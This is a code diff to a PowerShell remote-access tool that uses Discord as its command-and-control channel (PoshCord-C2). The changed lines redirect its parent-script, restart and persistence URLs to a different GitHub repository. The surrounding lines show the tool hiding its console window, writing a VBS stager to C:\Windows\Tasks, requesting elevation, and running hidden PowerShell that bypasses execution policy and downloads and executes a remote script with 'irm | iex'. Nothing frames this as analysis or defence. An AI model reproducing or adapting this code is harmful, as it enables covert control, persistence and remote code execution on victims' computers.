@@ -25,7 +25,7 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 0 # Option to start all jobs automatically upon running
-$parent = "https://raw.githubusercontent.com/brikodepo/PoshCord-C2/refs/heads/main/PoshCord-C2-main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://raw.githubusercontent.com/ThatCyanDev/uncreativeName9000/refs/heads/main/mgPI.ps1" # parent script URL (for restarts and persistance)
 
 # remove restart stager (no longer does that)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -801,7 +801,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/ThatCyanDev/uncreativeName9000/refs/heads/main/mgPI.ps1 | iex`", 0, True
 "@
     $pth = "C:\Windows\Tasks\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -1588,7 +1588,7 @@ Function VersionCheck {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/ThatCyanDev/uncreativeName9000/refs/heads/main/mgPI.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
